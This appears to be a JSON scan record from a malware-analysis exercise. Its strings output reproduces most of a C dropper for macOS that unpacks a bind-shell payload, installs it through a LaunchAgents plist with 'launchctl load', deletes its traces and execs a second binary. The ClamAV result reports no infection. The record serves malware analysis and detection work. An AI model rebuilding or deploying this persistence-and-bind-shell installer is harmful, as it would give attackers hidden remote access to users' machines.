{
    "filepath": "/home/chris/data/rpe005/malware_samples_exercise/20190522_112322_rpe005_malware_alert_folders/interdependable7rVTYTavxNcfkSNbaSHovYVZ1JBny9Ni1uXOdR6akXN9rZOboDYJdEFNnxLUTJsW/ef8bdf368eb7472aaf4c012aa75b90c81ebe8cf2c8f1aa6a8c3b66ac3d7d3f82/70a9dfbdfcd4dc40c35241c11eeb59ea43200250e7db6717b0330000a2b338ca",
    "fileinfo": {
        "labels": {
            "family": "bad_sample_5_folders",
            "software": "test_file"
        },
        "md5": "caf1c78df78a3ff5d693000fedb3ef42",
        "type": "C source, ASCII text",
        "clamav": "OK",
        "blobs": "Extracted 1 blobs (1 C)"
    },
    "plugins": [
        {
            "plugin": "extractors.disassembly",
            "version": "0.1",
            "results": {}
        },
        {
            "plugin": "extractors.strings",
            "version": "0.1",
            "results": {
                "#include <stdio.h>": 1,
                "#include <stdlib.h>": 1,
                "#include <unistd.h>": 1,
                "#include <string.h>": 1,
                "#include <errno.h>": 1,
                "#include \"common.h\"": 1,
                "#define UNPACK_SILENT": 1,
                "#include \"pack.c\"": 1,
                "#define BUF_SIZE": 1,
                "char *bindshell_data = (char *)(LDR_PATCH_ADDR)": 1,
                "void unpackBindshell(void) {": 1,
                "char fn[BUF_SIZE]": 2,
                "char cmd[BUF_SIZE]": 1,
                "snprintf(fn, BUF_SIZE - 1, \"/tmp/%s\", PLIST_NAME)": 1,
                "unpack(fn, bindshell_data, strlen(bindshell_data))": 2,
                "snprintf(cmd, BUF_SIZE - 1, \"cp %s ~/Library/LaunchAgents\", fn)": 1,
                "system(cmd)": 4,
                "system(\"launchctl load ~/Library/LaunchAgents\")": 1,
                "snprintf(cmd, BUF_SIZE - 1, \"rm -f %s\", fn)": 1,
                "int main(int argc, char **argv) {": 1,
                "char const * const progname = argv[0]": 1,
                "char cwd[BUF_SIZE]": 1,
                "getcwd(cwd, BUF_SIZE - 1)": 1,
                "fn[0] = '\\0'": 2,
                "if (progname[0] != '/')": 1,
                "snprintf(fn, BUF_SIZE - 1, \"%s/\", cwd)": 1,
                "strncat(fn, progname, BUF_SIZE - 1)": 1,
                "fn[strlen(fn) - 1] = '2'": 2,
                "unpackBindshell()": 1,
                "execl(fn, fn, NULL)": 1,
                "return 0": 2,
                "word: include": 14,
                "word: stdlib": 2,
                "word: unistd": 2,
                "word: string": 2,
                "word: common": 2,
                "word: define": 4,
                "word: unpack": 4,
                "word: silent": 2,
                "word: bindshell": 6,
                "word: unpackbindshell": 4,
                "word: snprintf": 8,
                "word: strlen": 4,
                "word: library": 4,
                "word: launchagents": 4,
                "word: system": 6,
                "word: launchctl": 2,
                "word: progname": 6,
                "word: getcwd": 2,
                "word: strncat": 2,
                "word: return": 2,
                "special: stdio.h": 2,
                "special: stdlib.h": 2,
                "special: unistd.h": 2,
                "special: string.h": 2,
                "special: errno.h": 2,
                "special: common.h": 2,
                "special: pack.c": 2,
                "special: Library/LaunchAgents": 2,
                "#include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <string.h> #include <errno.h> #include \"common.h\" #define unpack_silent 1 #include \"pack.c\" #define buf_size 10000 char *bindshell_data = (char *)(ldr_patch_addr)": 1,
                "void unpackbindshell(void) { char fn[buf_size]": 1,
                "char cmd[buf_size]": 1,
                "snprintf(fn, buf_size - 1, \"/tmp/%s\", plist_name)": 1,
                "snprintf(cmd, buf_size - 1, \"cp %s ~/library/launchagents\", fn)": 1,
                "system(\"launchctl load ~/library/launchagents\")": 1,
                "snprintf(cmd, buf_size - 1, \"rm -f %s\", fn)": 1,
                "} int main(int argc, char **argv) { char const * const progname = argv[0]": 1,
                "char fn[buf_size]": 1,
                "char cwd[buf_size]": 1,
                "getcwd(cwd, buf_size - 1)": 1,
                "if (progname[0] != '/') snprintf(fn, buf_size - 1, \"%s/\", cwd)": 1,
                "strncat(fn, progname, buf_size - 1)": 1,
                "unpackbindshell()": 1,
                "execl(fn, fn, null)": 1,
                "special: library/launchagents": 2
            }
        },
        {
            "plugin": "extractors.meta",
            "version": "0.1",
            "results": {
                "clamav: Cannot dlopen libclamunrar_iface: file not found - unrar support unavailable": 1,
                "clamav: cli_loadftm: File type signature for Microsoft Windows Shortcut File not loaded (required f-level: 1??)": 1,
                "clamav: [Bytecode JIT]; emitted ELF64-x86-64 <in-memory object> of 7?? bytes": 1,
                "clamav: bytecode self test running": 1,
                "clamav: Bytecode 4?????????: executing in JIT mode": 1,
                "clamav: bytecode finished in 3 us": 1,
                "clamav: bytecode self test succeeded": 1,
                "clamav: [Bytecode JIT]; emitted ELF64-x86-64 <in-memory object> of 1????? bytes": 1,
                "clamav: Bytecode: 94 bytecode prepared with JIT": 1,
                "clamav: Recognized ASCII text": 1,
                "clamav: cli_magic_scandesc: returning 0  at line 2???": 1,
                "clamav: malware family: OK": 1,
                "clamav: OK": 1,
                "clamav: Scanned files: 1": 1,
                "clamav: Infected files: 0": 1,
                "clamav: extracted blobs": 1,
                "clamav: extracted 1 blobs": 1,
                "clamav: blob size: 9??": 1,
                "clamav: Cannot dlopen libclamunrar_iface: file not found - unrar support unavailable;clamav: cli_loadftm: File type signature for Microsoft Windows Shortcut File not loaded (required f-level: 1??)": 1,
                "clamav: cli_loadftm: File type signature for Microsoft Windows Shortcut File not loaded (required f-level: 1??);clamav: [Bytecode JIT]; emitted ELF64-x86-64 <in-memory object> of 7?? bytes": 1,
                "clamav: [Bytecode JIT]; emitted ELF64-x86-64 <in-memory object> of 7?? bytes;clamav: bytecode self test running": 1,
                "clamav: bytecode self test running;clamav: Bytecode 4?????????: executing in JIT mode": 1,
                "clamav: Bytecode 4?????????: executing in JIT mode;clamav: bytecode finished in 3 us": 1,
                "clamav: bytecode finished in 3 us;clamav: bytecode self test succeeded": 1,
                "clamav: bytecode self test succeeded;clamav: [Bytecode JIT]; emitted ELF64-x86-64 <in-memory object> of 1????? bytes": 1,
                "clamav: [Bytecode JIT]; emitted ELF64-x86-64 <in-memory object> of 1????? bytes;clamav: Bytecode: 94 bytecode prepared with JIT": 1,
                "clamav: Bytecode: 94 bytecode prepared with JIT;clamav: Recognized ASCII text": 1,
                "clamav: Recognized ASCII text;clamav: cli_magic_scandesc: returning 0  at line 2???": 1,
                "clamav: cli_magic_scandesc: returning 0  at line 2???;clamav: malware family: OK": 1,
                "clamav: malware family: OK;clamav: OK": 1,
                "clamav: OK;clamav: Scanned files: 1": 1,
                "clamav: Scanned files: 1;clamav: Infected files: 0": 1,
                "clamav: Infected files: 0;clamav: extracted blobs": 1,
                "clamav: extracted blobs;clamav: extracted 1 blobs": 1,
                "clamav: extracted 1 blobs;clamav: blob size: 9??": 1,
                "File type: C source, ASCII text": 1,
                "File type segment: C source": 1,
                "File type word: C": 1,
                "File type word: source": 1,
                "File type segment:  ASCII text": 1,
                "File type word: ASCII": 1,
                "File type word: text": 1,
                "Extracted blob: C source, ASCII text, with very long lines, with no line terminators": 1,
                "blob file types: C": 1
            }
        }
    ]
}